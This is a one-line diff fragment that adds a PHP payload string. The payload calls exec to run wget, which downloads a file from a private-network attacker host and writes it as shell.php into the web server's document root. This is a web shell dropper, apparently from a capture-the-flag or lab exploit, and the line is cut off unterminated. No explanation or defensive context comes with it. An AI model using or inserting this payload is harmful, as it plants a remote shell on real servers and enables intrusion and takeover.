@@ -1,0 +1,1 @@
+'<?php exec("wget -O /var/www/html/shell.php http://10.10.14.126/t.php'
